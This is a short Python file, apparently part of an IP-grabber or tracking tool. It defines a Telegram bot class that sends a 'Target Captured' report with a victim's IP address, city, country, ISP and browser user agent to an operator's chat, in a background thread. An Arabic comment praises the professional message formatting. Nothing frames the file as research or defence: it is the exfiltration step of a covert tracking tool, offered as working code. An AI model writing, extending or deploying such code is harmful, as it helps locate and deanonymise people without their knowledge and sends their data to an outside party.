import requests
import threading

class MatrixBot:
    def __init__(self, token, chat_id):
        self.url = f"https://api.telegram.org/bot{token}/sendMessage"
        self.chat_id = chat_id

    def send_report(self, data):
        def _exec():
            # تنسيق رسالة احترافي جداً (HTML Mode)
            html = (
                f"<b>📍 Target Captured</b>\n"
                f"<code>IP: {data['ip']}</code>\n"
                f"<b>Region:</b> {data['city']}, {data['country']}\n"
                f"<b>ISP:</b> {data['isp']}\n"
                f"<b>Device:</b> <i>{data['ua']}</i>"
            )
            requests.post(self.url, json={
                "chat_id": self.chat_id,
                "text": html,
                "parse_mode": "HTML"
            })
        threading.Thread(target=_exec).start()
